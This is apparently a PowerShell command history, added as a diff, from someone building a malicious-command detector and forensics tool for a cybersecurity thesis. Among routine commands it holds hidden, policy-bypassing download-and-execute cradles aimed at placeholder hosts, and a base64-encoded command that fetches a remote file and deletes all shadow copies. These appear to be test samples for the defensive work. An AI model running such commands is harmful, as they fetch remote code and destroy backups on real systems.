@@ -1,0 +1,482 @@
+sqlmap
+netstat -ano
+stop process14932
+stop process 14932
+stop -process 14932
+stop -process -id 14932
+stop -process -pid 14932
+netstat -ano
+stop -process -pid 14932
+stop -process -id 14932
+stop-process -process -id 14932
+stop-process -id 14932
+stop -process 14932
+stop-process -process -id 14932
+stop-process -id 14932
+stop -process 14932
+netstat -ano
+stop -process 3000
+stop-process -id 3000
+ssh admin_mag@217.18.125.232
+ssh root@195.231.64.32
+New-Item -ItemType SymbolicLink -Path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Shell\Apri terminale.lnk" -Value "C:\Windows\system32"
+python main.py train --thr youden
+python main.py trai
+python main.py train
+python main.py all-in-one --csv parkinsons_disease_dataset.csv --json paziente_random.json --model parkinson_model.joblib --thr youden --out report.html
+python main.py random
+python main.py random_patient
+python main.py all-in-one --csv parkinsons_disease_dataset.csv --json paziente_random.json --model parkinson_model.joblib --thr youden --out report.html
+ping 172.29.42.4
+wmi
+wmi help
+wmi -h
+.\WindowManagement.dll
+clear
+Start-Process winword.exe
+Start-Process powerpnt.exe
+`
+`
+i=0`
+`
+while(i<10){`
+Start-Process powerpnt.exe`
+i++`
+}`
+
+`
+`
+i=0`
+`
+while(i<10){`
+Start-Process powerpnt.exe`
+i=i+1`
+}`
+
+`
+`
+i=0`
+`
+while(i<10){`
+Start-Process powerpnt.exe`
+i=+1`
+}`
+
+`
+`
+i=0`
+`
+while(i<10){`
+Start-Process powerpnt.exe`
+i+=1`
+}`
+
+`
+`
+i=0`
+`
+while(i -lt 10){`
+Start-Process powerpnt.exe`
+i=+1`
+}`
+
+`
+`
+i=0`
+`
+while(i<10){`
+Start-Process powerpnt.exe`
+i=i+1`
+}`
+
+`
+`
+i=0`
+`
+while(i -lt 10){`
+Start-Process powerpnt.exe`
+i=i+1`
+}`
+
+`
+`
+i=0`
+`
+while(i -lt 10){`
+i`
+}`
+
+`
+`
+i=0`
+`
+while(i < 10){`
+i`
+}`
+
+`
+`
+i=0`
+`
+while(i -lt 10){`
+i`
+}`
+
+`
+`
+$i=0`
+`
+while($i < 10){`
+$i`
+}`
+
+`
+`
+$i=0`
+`
+while($i -lt 10){`
+$i`
+}`
+
+`
+`
+$i=0`
+`
+while($i -lt 10){`
+$i = $i+1 `
+}`
+
+`
+`
+$i=0`
+`
+while($i -lt 10){`
+$i = $i+1`
+$i `
+}`
+
+`
+`
+$i=0`
+`
+while($i -lt 10){`
+Start-Process powerpnt.exe`
+$i=$i+1`
+}`
+
+WinMngt
+Get-Service winmgmt`
+
+sc start winmgmt`
+
+`
+`
+$i=0`
+`
+while($i -lt 10){`
+$i = $i+1 `
+$i}`
+
+`
+`
+$i=0`
+`
+while(1){`
+$i = $i+1 `
+$i}`
+
+Get-WmiObjectObject -Class Win64_OperatingSystem
+Get-WmiObject -Class Win64_OperatingSystem
+Get-WmiObject -Class Win32_OperatingSystem
+Get-WmiObject -Class Win32_ComputerSystem
+Get-WmiObject -Class Win32_Service
+Get-WmiObject -Class Win32_Processor
+wmic process list
+echo "hello.txt"
+dir
+cd
+clear
+cd .\Desktop\
+dir
+ipconfig
+clear
+echo "virus.txt"
+dir
+mkdir
+clear
+mkdir pino.txt
+mkdir test
+cd .\test\
+while(1)`
+{`
+`
+mkdir pino.txt`
+`
+}
+`
+`
+$i=1`
+`
+while(1){`
+`
+mkdir pino.txt{$i}`
+$i++`
+`
+`
+}
+`
+`
+$i=1`
+`
+while(1){`
+`
+mkdir pino.txt{i}`
+$i++`
+`
+`
+}
+clear
+`
+`
+$i=1`
+`
+while(1){`
+`
+mkdir "pino.txt{$i}"`
+$i++`
+`
+`
+}
+`
+`
+$i=1`
+cd "Desktop"`
+cd "test"`
+while($i lt 10){`
+mkdir "father"`
+cd "father"`
+mkdir "son{$i}.txt"`
+$i++`
+}
+`
+`
+$i=1`
+cd "Desktop"`
+cd "test"`
+while($i loreq 10){`
+mkdir "father"`
+cd "father"`
+mkdir "son{$i}.txt"`
+$i++`
+}
+`
+`
+$i=1`
+cd "Desktop"`
+cd "test"`
+while($i -le 10){`
+mkdir "father"`
+cd "father"`
+mkdir "son{$i}.txt"`
+$i++`
+}
+`
+`
+$i=1`
+cd "Desktop"`
+cd "test"`
+while($i -le 100){`
+mkdir "father"`
+cd "father"`
+mkdir "son$i.txt"`
+$i++`
+}
+`
+`
+$i=1`
+cd "Desktop"`
+cd "test"`
+while($i -le 100){`
+mkdir "father"`
+cd "father"`
+mkdir son"$i".txt`
+$i++`
+}
+clear
+cls
+clear
+`
+while($i -le 100){`
+clear`
+$i++`
+}
+cmd.exe
+help
+cls
+whatsapp.exe
+clear
+cls
+exit
+powershell.exe -NoP -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://server-remoto/payload.ps1')"
+powershell.exe -NoP -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://server-remoto/payload.ps1')"
+powershell.exe -NoP -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://www.google.com/payload.ps1')"
+powershell.exe -NoP -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://server-remoto/payload.ps1')"
+cd .\Desktop\
+cd .\cyber-thesis\
+cd .\detector2\
+python .\register_notifier.py
+pip install win32api
+pip install win32
+pip install win
+pip install pywin32
+python .\register_notifier.py
+pip update
+pip install
+pip install --upgrade pip
+python .\register_notifier.py
+cd .\Desktop\
+cd .\cyber-thesis\
+CD .\detector2\
+python .\register_notifier.py
+cd .\Desktop\
+CD .\cyber-thesis\
+CD .\detector2\
+python .\register_notifier.py
+cleatr
+cls
+python .\register_notifier.py
+pip install pyinstaller
+python .\main.py
+pip install pyinstaller
+pyinstaller --onefile main.py`
+
+cd ..
+cd .\Users\
+cd .\nbell\
+cd  .\Desktop\
+cd .\cyber-thesis\
+cd .\detector\
+python command_analyzer.py test/sospetto.txt
+cd ..
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} | Foreach-Object {`
+    $_.Properties[8].Value # Questo indice contiene la riga di comando`
+} | Where-Object {$_ -ne $null} | Out-File "log_processi_windows.txt"
+cd .\dataset\
+dir
+python .\main.py
+cd ..
+cd .\mpsd\
+dir
+python .\main.py
+cd .\models\
+cd .\random-forest\
+dir
+python .\build_dataset.py
+pip install openpyxl
+python .\build_dataset.py
+cd .\models\
+cd .\random-forest\
+python .\train.py
+cd .\models\random-forest\
+python .\predict.py 
+clear
+python .\train.py
+clear
+python .\train.py
+cls
+python .\train.py
+cls
+clear
+python .\train.py
+python .\predict.py 
+python .\train.py
+\subsection{Deployment: Motore di Inferenza Ibrido a Tre Strati}
+python .\train.py
+python .\predict.py 
+cd .\models\
+cd .\random_forest\
+cls
+python .\predict.py
+python .\grid_search.py
+cd ..
+cd de
+dir
+cd .\Users\
+cd .\nbell\
+cd .\Desktop\
+cd .\cyber-thesis\
+dir
+clear
+cd .\forensics-analysis\
+dir
+python .\main.py
+cd .\forensics-analysis\
+python .\main.py
+cd ..
+cd .\Users\
+cd .\nbell\
+CD .\Desktop\
+cd .\cyber-thesis\
+cd .\forensics-analysis\
+python .\main.py
+CLS
+python .\main.py
+cls
+python .\main.py
+cls
+python .\main.py
+pip install python-registry
+python .\main.py
+cd ..
+git status
+git add .\models\random_forest\predict.py
+git add .\models\random_forest\train.py
+git status
+git add .\forensics-analysis\main.py
+git commit -m "analisi forense, shadow copy"
+git push
+cls
+cd .\models\
+cd .\random_forest\
+python .\build_dataset.py
+python .\train.py
+python .\predict.py
+CD .\forensics-analysis\
+python .\app.py
+cd ..
+cd .\Users\
+cd .\nbell\
+cd .\Desktop\
+cd .\cyber-thesis\
+cd .\forensics-analysis\
+python .\app.py
+cls
+clear
+zoom in
+zoom
+cls
+python .\app.py
+pip install python-evtx
+python .\app.py
+clear
+python .\app.py
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
+AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enable
+AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enableauditpol /set /subcategory:"Creazione processo" /success:enable /failure:enable
+auditpol /set /subcategory:"Creazione processo" /success:enable /failure:enable
+powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZG9taW5pby1tYWxldm9sby5jb20vdmlydXMuZXhlJyk7IHZzc2FkbWluIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0
+cd ..
+cd .\Users\
+cd .\nbell\
+cd .\Desktop\
+cd .\cyber-thesis\
+cd .\forensics-analysis\
+python .\app.py
+cls
+python .\app.py
+cd ..
+cd .\Users\nbell\Desktop\cyber-thesis\forensics-analysis\
+python .\app.py
